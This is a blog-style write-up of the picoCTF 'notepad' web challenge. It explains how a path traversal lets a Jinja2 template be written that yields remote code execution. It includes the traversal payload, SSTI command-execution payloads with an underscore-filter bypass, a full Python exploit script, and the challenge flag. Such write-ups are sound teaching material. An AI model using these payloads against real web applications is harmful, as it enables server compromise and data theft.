---
title: "notepad writeup"
date: 2025-11-17
description: "picoCTF hard web chall"
tags: ["picoctf", "ctf", "web", "path traversal", "ssti"]
---

<img src="/blog/picoctf_notepad_writeup/images/chall.png" width=600>

We are given a simple webpage where we can create and display notes.  

<img src="/blog/picoctf_notepad_writeup/images/webpage.png" width=400>

Looking at the source code, there is a potential SSTI vulnerability in the way errors are displayed on the index page.  

<img src="/blog/picoctf_notepad_writeup/images/ssti.png" width=500>

There is also a path traversal vulnerability in the file writing process. If we were able to traverse into the directory with the error message templates, we can write a malicious HTML template there to gain RCE.  

<img src="/blog/picoctf_notepad_writeup/images/write.png" width=600>

Since only the first 128 characters of the filename will be sanitised by `url_fix()`, we just have to pad our payload with filler characters like `./` and the SSTI part of our payload won't be sanitised. Since we have to include the directory `../templates/error` in the filename, we just have to pad up till 108 characters.

To bypass the `/` filter, we can simply replace them with backslashes, which will be converted to forward slashes by `url_fix()`.  

```
..\templates\errors\{{7 * 7}}
```

After submitting the payload, we can retrieve the ID of our malicious template in the redirected URL.  

<img src="/blog/picoctf_notepad_writeup/images/notfound.png" width=600>

To trigger our SSTI payload, we simply have to visit the homepage and pass in our template ID in the `error` argument.  

<img src="/blog/picoctf_notepad_writeup/images/display.png" width=600>

The Dockerfile reveals that the flag file is stored with a randomly generated ID, hence we will have to inspect the directory structure using `os`.  

<img src="/blog/picoctf_notepad_writeup/images/dockerfile.png" width=500>

We can use a simple SSTI payload to execute and display arbitrary system commands.  

```python
{{cycler.__init__.__globals__['os'].popen('ls').read()}}
```

To bypass the `_` filter, we can use Jinja2 string formatting to obfuscate our payload.  

```python
{{cycler["%c%cinit%c%c"|format(95,95,95,95)]["%c%cglobals%c%c"|format(95,95,95,95)]['os'].popen('ls').read()}}
```

We can write a script to automate payload submissions for us. Running `ls` will reveal the filename of the flag file, which we can then read.  

```python
import requests
import re
import html

url = "https://notepad.mars.picoctf.net/"

s = requests.Session()

dir = "../templates/errors/"
payload = dir + "{{cycler['%c%cinit%c%c'|format(95,95,95,95)]['%c%cglobals%c%c'|format(95,95,95,95)]['os'].popen('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt').read()}}"

for i in range((128 - len(dir)) // 2):
    payload = './' + payload

res = s.post(f'{url}/new', data={"content": payload.replace("/", "\\")})

if "the requested" in res.text.lower():
    print("> payload uploaded")
else:
    print("> payload failed")
    print(res.text)
    exit()

print("URL:", res.url)
error = re.findall(r'errors\/(.+).html', res.url)[0]

res = s.get(f'{url}/?error={error}')

try:
    resp = re.findall(r'</h3>(.+)<h2>', res.text.replace("\n", ' '))[0]
    print(html.unescape(resp).replace("errors\\", "errors\\\n"))
except:
    print(res.text)
```

<img src="/blog/picoctf_notepad_writeup/images/flag.png" width=800>

Flag: `picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}`